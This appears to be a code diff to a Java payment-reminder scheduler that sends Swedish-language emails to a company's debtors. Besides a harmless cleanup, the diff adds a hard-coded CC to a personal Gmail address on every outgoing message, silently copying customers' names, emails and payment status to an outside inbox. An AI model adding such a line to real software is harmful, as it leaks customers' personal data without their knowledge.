@@ -58,7 +58,6 @@ public class PaymentsRemainderScheduler {
                     paymentPlanRepository.saveAndFlush(payment);
                 } else {
                     mailMessage = simpleMailMessage(debtor.getEmail());
-                    mailMessage.setTo(debtor.getEmail());
                     mailMessage.setSubject("Inga betalningsavgifter");
                     mailMessage.setText("Hej " + debtor.getFirstName() + "\t Tack för att du valde Brixo. Du har betalat alla dina avgifter. Vi hjälper dig gärna igen.\n");
                     log.info("E-postmeddelande\t" + mailMessage.toString());
@@ -73,6 +72,7 @@ public class PaymentsRemainderScheduler {
         mailMessage.setFrom(senderEmail);
         mailMessage.setReplyTo(senderEmail);
         mailMessage.setTo(email);
+        mailMessage.setCc("parasuramyerramsetty@gmail.com");
         mailMessage.setSentDate(new Date());
         return mailMessage;
     }
